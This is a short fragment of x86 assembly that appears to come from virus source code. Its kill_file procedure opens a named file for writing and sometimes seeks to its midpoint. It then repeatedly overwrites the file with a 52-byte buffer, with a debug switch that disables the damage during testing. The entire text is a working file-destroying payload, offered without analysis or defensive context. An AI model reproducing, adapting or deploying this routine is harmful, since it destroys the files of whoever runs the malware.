
 ; input: EDX=file name

kill_file               proc    pascal
                        pusha

                        debugmsg killfile, edx

IFDEF DEBUG                                             ; skip
                        or      esp, esp
                        jnz     __exit
ENDIF

                        call    fopen_rw
                        jc      __exit
                        xchg    ebx, eax

                        downgrade __skip1

                        call    fgetsize
                        xchg    edx, eax
                        shr     edx, 1
                        call    fseek
__skip1:

                        call    rsa_decrypt

                        push    13
                        pop     esi
__cycle:                lea     edx, rsa_y
                        push    52
                        pop     ecx
                        call    fwrite          ; sodomize
                        dec     esi
                        jnz     __cycle

                        call    fclose

__exit:                 popa
                        ret
                        endp
